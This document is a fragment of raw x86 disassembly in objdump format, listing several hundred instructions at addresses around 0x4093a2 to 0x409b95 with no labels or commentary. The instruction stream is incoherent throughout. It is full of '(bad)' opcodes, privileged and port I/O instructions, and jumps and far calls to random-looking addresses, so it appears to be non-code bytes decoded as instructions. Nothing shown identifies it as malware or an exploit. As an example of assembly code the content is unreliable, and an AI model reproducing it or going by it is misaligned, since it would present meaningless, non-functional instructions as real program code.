  4093a2:	neg    BYTE PTR [edx]
  4093a4:	out    dx,al
  4093a5:	and    al,0xe3
  4093a7:	imul   esp,DWORD PTR [ecx],0xfffffffd
  4093aa:	aaa    
  4093ab:	test   BYTE PTR [eiz*1+0xa431ade],ah
  4093b2:	(bad)  
  4093b3:	xchg   esp,eax
  4093b4:	loopne 0x4093d1
  4093b6:	repnz sbb eax,esi
  4093b9:	and    al,0x5b
  4093bb:	out    0xbd,al
  4093bd:	scas   al,BYTE PTR es:[edi]
  4093be:	xor    DWORD PTR ss:[eax+0x25],esi
  4093c2:	mov    dh,0x1a
  4093c4:	inc    ebx
  4093c5:	or     BYTE PTR [esi-0x29e40f6c],ch
  4093cb:	sbb    ebx,DWORD PTR [esi+0x34c60924]
  4093d1:	ret    
  4093d2:	xchg   esi,eax
  4093d3:	sbb    edx,esp
  4093d5:	push   ecx
  4093d6:	stc    
  4093d7:	(bad)  
  4093d8:	call   0x91519001
  4093dd:	repnz add BYTE PTR [ebp+0x1a],bh
  4093e1:	add    BYTE PTR [esi-0x66],dh
  4093e4:	(bad)  
  4093e5:	pop    ebx
  4093e6:	sub    BYTE PTR ds:0x32e901b1,dh
  4093ec:	mov    edi,edi
  4093ee:	aam    0x5a
  4093f0:	and    bl,BYTE PTR [edi]
  4093f2:	push   esp
  4093f3:	or     eax,0x16d4ff1a
  4093f8:	sbb    dh,BYTE PTR [ebp-0xf]
  4093fb:	sub    bl,cl
  4093fd:	fwait
  4093fe:	ds adc eax,0xf0205dba
  409404:	add    al,0x0
  409406:	xchg   esp,eax
  409407:	test   eax,0x822d812d
  40940c:	adc    bh,bh
  40940e:	push   ds
  40940f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409410:	(bad)  
  409411:	sti    
  409412:	mov    ecx,0xe0f944d
  409417:	fisttp WORD PTR ds:0x9882fe8
  40941d:	add    dl,dh
  40941f:	jb     0x40942b
  409421:	test   DWORD PTR [ebx+0x26000930],ebp
  409427:	scas   eax,DWORD PTR es:[edi]
  409428:	adc    DWORD PTR [eax],eax
  40942a:	jmp    0x25079d61
  40942f:	cmp    DWORD PTR [edx],ebx
  409431:	pop    es
  409432:	jmp    0x43404369
  409437:	xor    eax,0x2d52ffaf
  40943c:	mov    WORD PTR [ebp-0x4b],es
  40943f:	test   DWORD PTR [ebp+eax*4+0x1a1a00bd],ecx
  409446:	call   FWORD PTR [ecx]
  409448:	push   edx
  409449:	xchg   esp,eax
  40944a:	mul    DWORD PTR [esi-0x7e17e238]
  409450:	scas   eax,DWORD PTR es:[edi]
  409451:	or     BYTE PTR [eax],al
  409453:	loop   0x409447
  409455:	xchg   esp,eax
  409456:	add    al,0x80
  409458:	cmp    BYTE PTR [edi],al
  40945a:	add    BYTE PTR [eax],al
  40945c:	cwde   
  40945d:	ins    DWORD PTR es:[edi],dx
  40945e:	lods   eax,DWORD PTR ds:[esi]
  40945f:	dec    eax
  409460:	dec    ecx
  409461:	add    eax,0xed5875ff
  409466:	call   0x5026740c
  40946b:	mov    ebp,DWORD PTR [eax]
  40946d:	js     0x4093f4
  40946f:	hlt    
  409470:	pop    es
  409471:	out    0xfe,al
  409473:	push   eax
  409474:	call   0x88e5:0xffa1d8ed
  40947b:	test   DWORD PTR [eax],ecx
  40947d:	(bad)  
  40947e:	(bad)  
  40947f:	jmp    eax
  409481:	adc    eax,0x6affff9d
  409486:	jmp    DWORD PTR [edi-0xf]
  409489:	pop    eax
  40948a:	inc    eax
  40948b:	add    BYTE PTR [edi-0x4e],cl
  40948e:	out    dx,eax
  40948f:	idiv   DWORD PTR [edi]
  409491:	in     al,dx
  409492:	(bad)  
  409493:	jne    0x4094a1
  409495:	in     eax,0x31
  409497:	mov    eax,ds:0x8588ec3f
  40949c:	xor    al,0xf4
  40949e:	(bad)  
  40949f:	jmp    DWORD PTR [edx-0x638d97f4]
  4094a5:	dec    ebp
  4094a6:	(bad)  
  4094a7:	inc    BYTE PTR [eax]
  4094a9:	and    eax,0xcffff6fd
  4094ae:	jmp    0x409524
  4094b0:	or     al,0x0
  4094b2:	adc    al,0xa0
  4094b4:	(bad)  
  4094b5:	inc    DWORD PTR [ebp-0x1418137b]
  4094bb:	(bad)  
  4094bc:	push   0xffffffd8
  4094be:	fs jp  0x40951d
  4094c1:	or     DWORD PTR ds:0xf378b5ff,ecx
  4094c7:	(bad)  
  4094c8:	(bad)  
  4094c9:	fbstp  TBYTE PTR [ecx+0xb]
  4094cc:	call   0x3f419d
  4094d1:	and    DWORD PTR [ecx+0x7f31f7e8],eax
  4094d7:	and    ch,BYTE PTR [edx+0x31]
  4094da:	or     cl,BYTE PTR [eax+0x2221f05c]
  4094e0:	mov    ch,0x81
  4094e2:	lahf   
  4094e3:	and    edi,edi
  4094e5:	jbe    0x4094fc
  4094e7:	psubsb mm2,QWORD PTR [eax-0x3e]
  4094eb:	and    edi,edi
  4094ed:	mov    eax,0x5ef73ea5
  4094f2:	mov    bh,0x8f
  4094f4:	test   DWORD PTR [ecx-0x49],edx
  4094f7:	and    edi,edi
  4094f9:	loope  0x409544
  4094fb:	ja     0x409559
  4094fd:	lock and DWORD PTR [edx],esp
  409500:	mov    ch,0x41
  409502:	fbld   TBYTE PTR [ecx]
  409504:	push   DWORD PTR [esi]
  409506:	adc    eax,0x22704835
  40950b:	sub    edi,DWORD PTR [esi+0x21eed100]
  409511:	or     esi,ecx
  409513:	jge    0x409511
  409515:	adc    ah,0x1
  409518:	sbb    bh,bh
  40951a:	push   cs
  40951b:	cs cwde 
  40951d:	clts   
  40951f:	push   edx
  409520:	xchg   edx,eax
  409521:	test   ecx,ebx
  409523:	push   ds
  409524:	and    edi,edi
  409526:	popa   
  409527:	or     cl,BYTE PTR [esi+0x2d26ee9d]
  40952d:	adc    al,0x3a
  40952f:	bound  ebx,QWORD PTR [eax-0x5ec57efb]
  409535:	pushf  
  409536:	(bad)  
  409537:	ds dec ecx
  409539:	test   ecx,ebp
  40953b:	ds and edi,edi
  40953e:	sbb    al,0x22
  409540:	add    eax,DWORD PTR [eax]
  409542:	lods   al,BYTE PTR ds:[esi]
  409543:	lods   al,BYTE PTR ds:[esi]
  409544:	xor    esi,edi
  409546:	mov    dh,0x5e
  409548:	mov    ah,0x67
  40954a:	into   
  40954b:	add    eax,0x8a7ffc3
  409550:	pop    esp
  409551:	adc    al,0xa6
  409553:	pop    ss
  409554:	sahf   
  409555:	and    DWORD PTR [eax*1+0x17ae9581],ebx
  40955c:	mov    cs,WORD PTR [ebx+0x217e3cac]
  409562:	jle    0x4094ef
  409564:	cmp    al,0x28
  409566:	jle    0x40957f
  409568:	jbe    0x40956e
  40956a:	lea    edx,ds:[edx+0x4]
  40956e:	xor    DWORD PTR [ecx],ecx
  409570:	push   0x5f
  409572:	add    BYTE PTR [ebp+0x1f],cl
  409575:	pop    esi
  409576:	and    DWORD PTR [ecx],esi
  409578:	or     BYTE PTR [ebp-0x6e],ch
  40957b:	xor    DWORD PTR [ecx],ecx
  40957d:	jmp    0x3e611a06
  409582:	and    DWORD PTR [esi],edi
  409584:	or     dh,ch
  409586:	xchg   DWORD PTR [eax-0x66fc16f8],esi
  40958c:	stc    
  40958d:	call   0x9c577cc2
  409592:	or     ecx,DWORD PTR [ecx]
  409594:	cmp    al,0x80
  409596:	and    DWORD PTR [esi],edx
  409598:	pop    ss
  409599:	pop    esp
  40959a:	xor    BYTE PTR [esi],al
  40959c:	pop    ss
  40959d:	push   cs
  40959e:	and    DWORD PTR [ecx+eax*1+0x11],edi
  4095a2:	jmp    0x21bc:0x20fe1698
  4095a9:	(bad)  
  4095aa:	and    dh,ch
  4095ac:	push   ss
  4095ad:	je     0x4095ba
  4095af:	fyl2x  
  4095b1:	and    BYTE PTR [eax],0xde
  4095b4:	push   ss
  4095b5:	xchg   esp,eax
  4095b6:	daa    
  4095b7:	ficom  WORD PTR [esi]
  4095b9:	(bad)  
  4095ba:	and    BYTE PTR [ecx+eax*1-0x3f],al
  4095be:	or     eax,0x20c616ab
  4095c3:	test   BYTE PTR [ecx],dh
  4095c5:	mov    dh,0x20
  4095c7:	mov    dh,0x16
  4095c9:	add    BYTE PTR [edi*1+0x51509a21],bh
  4095d0:	push   ss
  4095d1:	call   FWORD PTR [esi+ebx*2+0x1e]
  4095d5:	call   FWORD PTR [esi+0x79c5100]
  4095db:	add    DWORD PTR [eax+0x70],0x54ad8eff
  4095e2:	aam    0x7e
  4095e4:	push   ecx
  4095e5:	push   ss
  4095e6:	add    ch,dh
  4095e8:	jne    0x409575
  4095ea:	mov    ebp,0xff164999
  4095ef:	in     eax,0xbf
  4095f1:	clc    
  4095f2:	mov    ch,BYTE PTR [esi+eiz*1+0x1e]
  4095f6:	call   FWORD PTR [esi+0x11]
  4095f9:	fsin   
  4095fb:	fdivr  QWORD PTR [edx]
  4095fd:	and    DWORD PTR [edx+0x70],ebp
  409600:	adc    DWORD PTR [esi],edx
  409602:	jmp    0x4095f7
  409604:	mov    WORD PTR [esi],ss
  409606:	(bad)  
  409607:	mov    ah,0x2a
  409609:	and    DWORD PTR [esi+0x50],ebx
  40960c:	push   ecx
  40960d:	push   ss
  40960e:	push   DWORD PTR [esi+ecx*2+0x1e]
  409612:	jmp    DWORD PTR [esi]
  409614:	dec    edx
  409615:	imul   ebx,DWORD PTR [esi+ebx*1+0x5b51651],0x29
  40961d:	push   ss
  40961e:	inc    DWORD PTR [ecx]
  409620:	mov    DWORD PTR [ebp-0x1],esi
  409623:	push   es
  409624:	push   ecx
  409625:	pop    esp
  409626:	call   0xe856ad21
  40962b:	outs   dx,BYTE PTR gs:[esi]
  40962d:	push   ss
  40962e:	(bad)  
  40962f:	out    dx,al
  409630:	jl     0x409667
  409632:	mul    esi
  409634:	and    DWORD PTR ds:[ecx-0xe9c983],eax
  40963b:	pushf  
  40963c:	add    BYTE PTR [ecx],cl
  40963e:	push   ds
  40963f:	dec    esi
  409641:	adc    eax,0xf7009b9f
  409646:	cmc    
  409647:	(bad)  
  409648:	mov    ch,0x78
  40964a:	std    
  40964b:	(bad)  
  40964c:	jmp    edi
  40964e:	outs   dx,DWORD PTR ds:[esi]
  40964f:	or     edi,edi
  409651:	pop    ebp
  409652:	add    eax,0xf5d5b9e8
  409657:	(bad)  
  409658:	(bad)  
  409659:	std    
  40965a:	cld    
  40965b:	idiv   bh
  40965d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40965e:	in     al,0x59
  409660:	pushf  
  409661:	mov    bh,0xf5
  409663:	inc    BYTE PTR [ebp-0x50]
  409666:	jecxz  0x409634
  409668:	std    
  409669:	div    ebp
  40966b:	(bad)  
  40966c:	jne    0x409652
  40966e:	in     al,0x75
  409670:	mov    BYTE PTR [eax+0x9],bl
  409673:	leave  
  409674:	ret    0x964
  409677:	push   ebp
  409678:	mov    esp,esp
  40967a:	mov    esp,eax
  40967c:	cld    
  40967d:	jb     0x409688
  40967f:	push   0x1c
  409681:	imul   DWORD PTR [edi+0x7]
  409684:	call   0x3f2aed
  409689:	sar    DWORD PTR [edi],0xfb
  40968c:	push   0x4049b2
  409691:	push   edi
  409692:	xor    dl,cl
  409694:	dec    eax
  409695:	leave  
  409696:	or     bh,bh
  409698:	jne    0x4096ba
  40969a:	loope  0x40970d
  40969c:	std    
  40969d:	daa    
  40969e:	hlt    
  40969f:	stos   BYTE PTR es:[di],al
  4096a1:	add    ah,dl
  4096a3:	dec    ebp
  4096a4:	jmp    DWORD PTR [edi+0xa]
  4096a7:	or     DWORD PTR [eax],eax
  4096a9:	xor    bh,0x71
  4096ac:	pop    es
  4096ad:	call   0x3f806a
  4096b2:	xlat   BYTE PTR ds:[ebx]
  4096b3:	jno    0x4096b0
  4096b5:	(bad)  
  4096b6:	jge    0x4096bd
  4096b8:	call   0xff34483c
  4096bd:	leave  
  4096be:	xor    DWORD PTR [eax+0x7],esp
  4096c1:	add    BYTE PTR [edi+eiz*4+0x2e],bl
  4096c5:	xor    ebp,0xb6ff1d56
  4096cb:	mov    eax,0x5b4c6a03
  4096d0:	cwde   
  4096d1:	pop    es
  4096d2:	cdq    
  4096d3:	add    bh,BYTE PTR [ebp-0x1]
  4096d6:	sahf   
  4096d7:	cdq    
  4096d8:	(bad)  
  4096d9:	sti    
  4096da:	or     DWORD PTR [esi],ebp
  4096dc:	add    al,0x0
  4096de:	xor    DWORD PTR [ebp-0x7c780879],ebp
  4096e4:	push   ds
  4096e5:	push   eax
  4096e6:	mov    DWORD PTR [esi+eax*4],edx
  4096e9:	add    BYTE PTR [ecx],dh
  4096eb:	pop    ss
  4096ec:	inc    ebx
  4096ed:	je     0x40970c
  4096ef:	pop    ebp
  4096f0:	pop    es
  4096f1:	add    DWORD PTR [ecx],esi
  4096f3:	and    dl,BYTE PTR [esi-0x412036dc]
  4096f9:	inc    eax
  4096fa:	xor    DWORD PTR [ebp-0x44b00879],esp
  409700:	sbb    eax,0x7e5b5950
  409705:	inc    DWORD PTR [eax]
  409707:	ds jb  0x4096b5
  40970a:	push   DWORD PTR [esi]
  40970c:	ret    
  40970d:	pop    esp
  40970e:	push   eax
  40970f:	cs push ebp
  409711:	or     ebp,eax
  409713:	fnstsw ax
  409715:	sbb    eax,0x79c609ff
  40971a:	call   DWORD PTR [esi]
  40971c:	repz xchg edi,eax
  40971e:	sti    
  40971f:	push   cs
  409720:	jne    0x40972d
  409722:	call   0xff5e3045
  409727:	call   0x5c409e0b
  40972c:	xchg   edi,eax
  40972d:	cs xor ebp,0x1d
  409731:	test   al,0xff
  409733:	pop    eax
  409734:	inc    esp
  409735:	push   ds
  409736:	jne    0x409761
  409738:	or     ecx,edx
  40973a:	pop    ecx
  40973b:	mov    ecx,0x748bde13
  409740:	adc    eax,0x24310441
  409745:	(bad)  
  409746:	lods   al,BYTE PTR ds:[esi]
  409747:	out    dx,al
  409748:	mov    ah,0x27
  40974a:	add    al,0x49
  40974c:	xor    eax,0x12aec31d
  409751:	cmp    al,0xc
  409753:	cdq    
  409754:	push   0xffffffa5
  409756:	sbb    eax,0x201c139e
  40975b:	xchg   esi,eax
  40975c:	popf   
  40975d:	lock sub ebp,DWORD PTR [ebp+0x70]
  409761:	xchg   esi,eax
  409762:	sbb    eax,0x3e54678
  409767:	in     al,0x7f
  409769:	xchg   ebp,eax
  40976a:	add    DWORD PTR [eax],0x6d
  40976d:	cmp    al,0x76
  40976f:	sbb    eax,0x202c856e
  409774:	add    DWORD PTR [esp+esi*8],edx
  409777:	repz pop edi
  409779:	popf   
  40977a:	hlt    
  40977b:	sub    ebx,ebp
  40977d:	mov    ebp,ecx
  40977f:	add    edi,DWORD PTR [edx]
  409781:	dec    ecx
  409782:	out    0x86,al
  409784:	cmp    eax,0x7603e909
  409789:	int    0x40
  40978b:	add    al,0x31
  40978d:	or     ecx,ebp
  40978f:	inc    esp
  409790:	je     0x4097af
  409792:	ss add eax,0x3c30931
  409798:	mov    ecx,DWORD PTR [ecx]
  40979a:	xchg   ebx,eax
  40979b:	add    ecx,DWORD PTR [ebx+0x2c76c09]
  4097a1:	mov    edx,0x1afd8763
  4097a6:	push   cs
  4097a7:	sbb    eax,0x1b7c1261
  4097ac:	neg    BYTE PTR [esp+edi*8+0x8a772b]
  4097b3:	jmp    0x760095ea
  4097b8:	aaa    
  4097b9:	and    BYTE PTR [edi+0x680932e8],dh
  4097bf:	(bad)  
  4097c0:	cli    
  4097c1:	leave  
  4097c2:	call   ebp
  4097c4:	lahf   
  4097c5:	add    ch,al
  4097c7:	jbe    0x409805
  4097c9:	adc    bh,bh
  4097cb:	sbb    DWORD PTR [eax+0x648d39],ebp
  4097d1:	inc    esi
  4097d2:	sbb    bh,bh
  4097d4:	mov    dh,0xe2
  4097d6:	mov    eax,0x121c66e7
  4097db:	push   DWORD PTR [eax-0x51]
  4097de:	sbb    edi,esi
  4097e0:	sahf   
  4097e1:	sub    eax,0x2573dd21
  4097e6:	adc    cl,BYTE PTR [ebp-0xe5ad9c]
  4097ec:	xchg   dl,al
  4097ee:	stos   BYTE PTR es:[edi],al
  4097ef:	in     eax,0x1d
  4097f1:	jb     0x409805
  4097f3:	(bad)  
  4097f4:	cmp    al,0x42
  4097f6:	sbb    bh,bh
  4097f8:	outs   dx,BYTE PTR ds:[esi]
  4097f9:	cmp    eax,0x19510b9c
  4097fe:	je     0x4097ff
  409800:	pop    esi
  409801:	mov    ebx,0x255ee48c
  409806:	adc    ch,BYTE PTR [edx-0x17]
  409809:	mov    ah,BYTE PTR [ebx]
  40980b:	pop    esp
  40980c:	test   al,0x32
  40980e:	adc    dh,BYTE PTR [ebp-0xedbac7]
  409814:	ss mov edi,0x9f29e7fd
  40981a:	adc    bh,bh
  40981c:	jo     0x4097cd
  40981e:	and    al,0xf7
  409820:	push   ds
  409821:	sub    eax,0x2180ff9f
  409826:	mov    ch,0x40
  409828:	jmp    0x130f44a
  40982d:	imul   ebp
  40982f:	(bad)  
  409830:	jmp    DWORD PTR [ebp+0x2]
  409833:	call   0xf5bd98dd
  409838:	dec    BYTE PTR [ecx-0x921ab]
  40983e:	iret   
  40983f:	(bad)  
  409840:	jmp    DWORD PTR [edi-0x14]
  409843:	push   eax
  409844:	inc    eax
  409845:	add    bh,bl
  409847:	mov    bh,0xef
  409849:	imul   edi
  40984b:	in     eax,dx
  40984c:	(bad)  
  40984d:	jne    0x40980b
  40984f:	fisttp QWORD PTR [ecx-0x77121063]
  409855:	test   DWORD PTR [ebp+esi*8+0xcf2fffe],edi
  40985c:	push   0xff4bed0a
  409861:	(bad)  
  409862:	in     eax,0xfc
  409864:	idiv   bh
  409866:	lahf   
  409867:	in     eax,dx
  409868:	je     0x409876
  40986a:	mov    al,0x5d
  40986c:	pushf  
  40986d:	jmp    FWORD PTR [edi-0x18277a7d]
  409873:	in     eax,dx
  409874:	(bad)  
  409875:	push   0x58
  409877:	pop    ebp
  409878:	inc    ebp
  409879:	pop    ebp
  40987a:	or     DWORD PTR ds:0xf5f8b5ff,ecx
  409880:	(bad)  
  409881:	(bad)  
  409882:	out    dx,eax
  409883:	ja     0x409890
  409885:	call   0x3f290e
  40988a:	rol    DWORD PTR [edi-0x1210082c],1
  409890:	cmp    BYTE PTR [ebp-0x1038c],0x18
  409897:	cmp    DWORD PTR [eax-0x7d],0xf6e18d00
  40989e:	dec    DWORD PTR [edi+0x5]
  4098a1:	je     0x409913
  4098a3:	fwait
  4098a4:	mov    dl,0xe7
  4098a6:	div    DWORD PTR [ecx]
  4098a8:	neg    DWORD PTR [edx]
  4098aa:	add    BYTE PTR [ebp+0x310fab87],al
  4098b0:	neg    DWORD PTR [ecx-0x1]
  4098b3:	sbb    ch,BYTE PTR fs:[ebx]
  4098b6:	mov    edi,0xff1a17bf
  4098bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098bc:	push   cs
  4098bd:	adc    bh,bh
  4098bf:	(bad)  
  4098c0:	daa    
  4098c1:	nop
  4098c2:	pop    es
  4098c3:	fst    DWORD PTR [ebx]
  4098c5:	jb     0x4098c6
  4098c7:	(bad)  
  4098c8:	aaa    
  4098c9:	push   eax
  4098ca:	call   0xff5ad895
  4098cf:	cmp    al,0x1a
  4098d1:	sub    eax,DWORD PTR ds:0xff1a4fc6
  4098d7:	fadd   QWORD PTR [edx+0x12]
  4098da:	call   FWORD PTR [esi-0x611bafa1]
  4098e0:	addr16 sbb bh,bh
  4098e3:	add    al,0x1a
  4098e5:	sub    eax,ebp
  4098e7:	lahf   
  4098e8:	ja     0x409904
  4098ea:	inc    esp
  4098ec:	pop    edx
  4098ed:	adc    bh,bh
  4098ef:	jbe    0x409878
  4098f1:	nop
  4098f2:	pop    es
  4098f3:	pop    ecx
  4098f4:	xor    DWORD PTR [ecx-0x1],0x66
  4098f8:	xchg   edi,eax
  4098f9:	dec    edi
  4098fa:	fsub   QWORD PTR [esi-0x61]
  4098fd:	sbb    edi,edi
  4098ff:	add    ah,bl
  409901:	sbb    DWORD PTR [ebx],ebp
  409903:	aad    0xa7
  409905:	scas   eax,DWORD PTR es:[edi]
  409906:	sbb    edi,edi
  409908:	jl     0x4098d8
  40990a:	adc    edi,edi
  40990c:	ds mov edi,0xdf49078f
  409912:	jo     0x409913
  409914:	cs iret 
  409916:	dec    edi
  409917:	in     al,0x1e
  409919:	xlat   BYTE PTR ds:[ebx]
  40991a:	sbb    eax,ebp
  40991c:	enter  0x19b8,0xff
  409920:	push   ss
  409921:	or     DWORD PTR [edi+eiz*1+0x6],ebx
  409925:	adc    BYTE PTR [esi],bl
  409927:	sub    esp,DWORD PTR [edi-0x1e5e98f]
  40992d:	push   ebp
  40992e:	add    DWORD PTR [edx],edx
  409930:	test   BYTE PTR [edi],0x11
  409933:	jbe    0x4098fd
  409935:	paddd  mm3,QWORD PTR [ecx]
  409938:	pushf  
  409939:	sub    al,0xfe
  40993b:	sbb    esi,ebx
  40993d:	and    BYTE PTR [ecx+0x7c],ah
  409940:	(bad)  
  409941:	(bad)  
  409943:	dec    edi
  409944:	jmp    0xd95a7760
  409949:	lea    ebp,[edi+0x19]
  40994c:	mov    esi,0xbe30940f
  409951:	shufps xmm5,XMMWORD PTR [ebx+eiz*1],0x72
  409956:	mov    esi,0xb955a619
  40995b:	adc    DWORD PTR [esi+0x2a8fae0f],ebx
  409961:	adc    BYTE PTR [esp+ecx*1],bl
  409964:	add    BYTE PTR [ecx-0x79e660f9],bl
  40996a:	subps  xmm2,XMMWORD PTR [esi+eax*4]
  40996e:	jle    0x86b278a0
  409974:	sbb    DWORD PTR [esi-0x3b],ebp
  409977:	sub    BYTE PTR [ebx],0x4a
  40997a:	pcmpeqd mm3,QWORD PTR [ecx]
  40997d:	pop    esi
  40997e:	xchg   ebp,eax
  40997f:	ins    BYTE PTR es:[edi],dx
  409980:	sub    al,0xe3
  409982:	test   ecx,ebp
  409984:	add    edi,DWORD PTR [eax+0x4a]
  409987:	in     eax,dx
  409988:	add    ebx,esp
  40998a:	add    DWORD PTR [ebp-0x7b],0x75
  40998e:	or     al,0xc3
  409990:	add    ecx,ebx
  409992:	out    dx,eax
  409993:	inc    ebp
  409994:	(bad)  
  409995:	ss and ecx,edx
  409998:	jno    0x4099c0
  40999a:	verr   WORD PTR [eax-0x22]
  40999e:	adc    ch,BYTE PTR [eax-0x22]
  4099a1:	(bad)  
  4099a3:	jmp    DWORD PTR ds:0xa84838fe
  4099a9:	xor    cl,BYTE PTR [esi]
  4099ab:	jne    0x40998e
  4099ad:	dec    edx
  4099ae:	dec    ecx
  4099af:	std    
  4099b0:	push   cs
  4099b1:	sbb    BYTE PTR [ecx+0xef3a40e],ah
  4099b7:	addr16 jmp 0x4099ec
  4099ba:	or     DWORD PTR [eax-0x17f9500a],eax
  4099c0:	aas    
  4099c1:	ds push cs
  4099c3:	jmp    esi
  4099c5:	mov    edi,0x54ff12
  4099ca:	xor    eax,0x197f7b21
  4099cf:	push   cs
  4099d0:	leave  
  4099d1:	stos   DWORD PTR es:[edi],eax
  4099d2:	mov    dh,0xe
  4099d4:	push   esp
  4099d5:	jb     0x409a2d
  4099d7:	mov    al,ah
  4099d9:	mov    ebp,0xe969b7e0
  4099de:	int3   
  4099df:	out    dx,al
  4099e0:	(bad)  
  4099e1:	xor    al,0x25
  4099e3:	and    DWORD PTR ds:0x890e297f,ebx
  4099e9:	and    al,0x29
  4099eb:	xor    BYTE PTR ds:0xffc96d3f,0x61
  4099f2:	pop    edi
  4099f3:	mov    al,0x47
  4099f5:	sub    BYTE PTR ds:0xb6e93f89,dh
  4099fb:	test   eax,0xc9a61467
  409a00:	call   DWORD PTR [esi]
  409a02:	add    eax,0x32e984d3
  409a07:	mov    ecx,0xc97fb867
  409a0c:	(bad)  
  409a0d:	mov    ebp,0xe984df0a
  409a12:	xor    dh,BYTE PTR [ebx+0x7f58000a]
  409a18:	add    ecx,DWORD PTR [ebx]
  409a1a:	dec    edx
  409a1b:	jle    0x409a46
  409a1d:	push   esi
  409a1e:	jo     0x409a97
  409a20:	mov    eax,ds:0x686247ff
  409a25:	pop    ebp
  409a26:	(bad)  [ecx]
  409a28:	push   eax
  409a29:	call   0x3f30b9
  409a2e:	add    BYTE PTR [eax-0x800009f],bh
  409a34:	mov    al,0x67
  409a36:	fs xchg ebp,eax
  409a38:	dec    edx
  409a39:	dec    DWORD PTR [edi-0x19]
  409a3c:	jnp    0x409a45
  409a3e:	call   0x3f65a9
  409a43:	xor    BYTE PTR [ecx-0x1e280068],cl
  409a49:	add    BYTE PTR [esi+0x58],al
  409a4c:	aaa    
  409a4d:	push   DWORD PTR [edx+eiz*8+0x4e]
  409a51:	sti    
  409a52:	xor    ecx,DWORD PTR [eax+0x77fffeab]
  409a58:	cmc    
  409a59:	icebp  
  409a5a:	scas   al,BYTE PTR es:[edi]
  409a5b:	xor    BYTE PTR [esi],cl
  409a5d:	je     0x4099fe
  409a5f:	out    0x77,eax
  409a61:	sti    
  409a62:	call   FWORD PTR [ebp-0x3]
  409a65:	out    0xe3,eax
  409a67:	or     eax,0x465ffef6
  409a6c:	mov    esp,0x588804c1
  409a71:	mov    ch,ah
  409a73:	or     ecx,ecx
  409a75:	sti    
  409a76:	jmp    FWORD PTR [ebp+0x5]
  409a79:	push   DWORD PTR [ebp+0x60]
  409a7c:	loope  0x409a77
  409a7e:	xchg   edx,eax
  409a7f:	out    0xf5,eax
  409a81:	mov    BYTE PTR [ebp-0x3c],al
  409a84:	cmc    
  409a85:	je     0x409a83
  409a87:	xlat   BYTE PTR ds:[ebx]
  409a88:	ja     0x409a91
  409a8a:	call   0x3f3401
  409a8f:	xor    DWORD PTR [ebx+0x2a000bc8],ebp
  409a95:	loopne 0x409a26
  409a97:	inc    ecx
  409a98:	mov    dl,0x9
  409a9a:	add    al,0x74
  409a9c:	fs retf 
  409a9e:	nop
  409a9f:	sti    
  409aa0:	or     DWORD PTR [eax+0x7b],esp
  409aa3:	call   DWORD PTR [esi]
  409aa5:	jae    0x409abd
  409aa7:	jne    0x409ae6
  409aa9:	jecxz  0x409a3b
  409aab:	sti    
  409aac:	popa   
  409aad:	jmp    0x409a3f
  409aaf:	pop    es
  409ab0:	or     ecx,eax
  409ab2:	jno    0x409ab3
  409ab4:	neg    BYTE PTR [eax-0x76]
  409ab7:	dec    ebp
  409ab8:	cmp    eax,0x5dffdc9f
  409abd:	sbb    BYTE PTR [ecx+0x16ba2ce7],dh
  409ac3:	dec    DWORD PTR [edx]
  409ac5:	loop   0x409af1
  409ac7:	adc    al,0xb2
  409ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aca:	repz inc DWORD PTR [edx+0x1a]
  409ace:	mov    al,BYTE PTR [ebp+0x21]
  409ad1:	xor    edx,DWORD PTR [eax-0x75dd5905]
  409ad7:	ret    0x209a
  409ada:	jmp    0x400:0x76078bf
  409ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae2:	call   FWORD PTR es:[esi+ebp*1]
  409ae6:	push   ss
  409ae7:	jne    0x409b22
  409ae9:	jp     0x409a71
  409aeb:	xchg   edx,eax
  409aec:	xchg   BYTE PTR [ebx+0x16],ch
  409aef:	jne    0x409b1e
  409af1:	rcl    BYTE PTR [esi],cl
  409af3:	jne    0x409b1e
  409af5:	mov    bh,dh
  409af7:	xchg   edx,eax
  409af8:	add    BYTE PTR [esi-0x7d],ch
  409afb:	dec    esp
  409afc:	ret    0x2239
  409aff:	mov    al,0x8a
  409b01:	dec    ebp
  409b02:	lahf   
  409b03:	ds sar bh,0xf2
  409b07:	mov    dl,0x82
  409b09:	int3   
  409b0a:	or     cl,dh
  409b0c:	add    edi,DWORD PTR [ebp+0x2a9869f6]
  409b12:	or     ebp,ebx
  409b14:	pop    es
  409b15:	mov    dl,0x8e
  409b17:	clc    
  409b18:	add    esp,DWORD PTR [ebp+0x42986a03]
  409b1e:	or     DWORD PTR [esp+ecx*1-0x496db6b6],esi
  409b25:	je     0x409b69
  409b27:	sub    esi,ebx
  409b29:	push   cs
  409b2a:	jg     0x409ad8
  409b2c:	pop    es
  409b2d:	mov    dl,0x28
  409b2f:	out    0x82,al
  409b31:	jl     0x409b30
  409b33:	call   0x2940cdc7
  409b38:	(bad)  
  409b39:	cmp    eax,esp
  409b3b:	sub    BYTE PTR [edx+0x412fab87],bh
  409b41:	inc    ecx
  409b42:	or     DWORD PTR [edx-0x40],esp
  409b45:	inc    edx
  409b46:	mov    BYTE PTR [ecx],cl
  409b48:	(bad)  
  409b49:	mov    bl,0x8d
  409b4b:	cld    
  409b4c:	add    edi,DWORD PTR ds:0x4543f205
  409b52:	add    al,BYTE PTR [edx]
  409b54:	inc    esp
  409b55:	pop    edx
  409b56:	lods   al,BYTE PTR ds:[esi]
  409b57:	cs dec ebx
  409b59:	jae    0x409b53
  409b5b:	call   0xbcb9c48
  409b60:	xor    al,0x8
  409b62:	scas   al,BYTE PTR es:[edi]
  409b63:	lds    ebp,FWORD PTR [eax-0x1db7137f]
  409b69:	adc    al,0x4
  409b6b:	dec    ecx
  409b6c:	xchg   ecx,eax
  409b6d:	call   0xc5a8:0x189e0b9f
  409b74:	lods   al,BYTE PTR ds:[esi]
  409b75:	mov    esp,esi
  409b77:	inc    esp
  409b78:	dec    edi
  409b79:	xchg   ecx,eax
  409b7a:	or     eax,0x3a5ae8ca
  409b7f:	or     ecx,ebp
  409b81:	add    esp,DWORD PTR [edx+0x64]
  409b84:	add    BYTE PTR [edx-0x5a],ah
  409b87:	add    ecx,DWORD PTR [ebx-0x5be7c6e4]
  409b8d:	je     0x409b15
  409b8f:	sbb    edx,DWORD PTR [eax+0x5e]
  409b92:	scas   al,BYTE PTR es:[edi]
  409b93:	dec    ebx
  409b94:	(bad)  
  409b95:	fdivr  st(6),st
